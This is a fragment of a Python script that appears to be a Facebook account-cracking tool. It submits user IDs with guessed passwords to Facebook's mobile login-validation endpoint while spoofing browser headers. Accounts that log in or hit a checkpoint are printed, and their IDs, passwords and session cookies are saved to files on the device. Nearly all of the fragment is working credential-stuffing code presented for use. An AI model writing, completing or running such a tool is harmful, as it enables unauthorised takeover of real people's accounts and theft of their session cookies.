            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[1;31m [SAURAV-CP] {idf} │ {pw} {P}')                
                open('/sdcard/SAURAV-CP.txt', 'a').write(idf+' | '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r{P}{H} [SAURAV-OK] {idf} │ {pw} {P}  \n [\u001b[36m•\033[1;37m] COOKIE = {H}'+ kuki)                
                open('/sdcard/SAURAV-OK.txt', 'a').write(idf+' | '+pw+' | '+kuki+'\n')
                break
                
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
 
#-----------------------[ SYSTEM-CONTROL ]--------------------#
 
if __name__=='__main__':
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
    try:os.system('touch .prox.txt')
    except:pass
menu()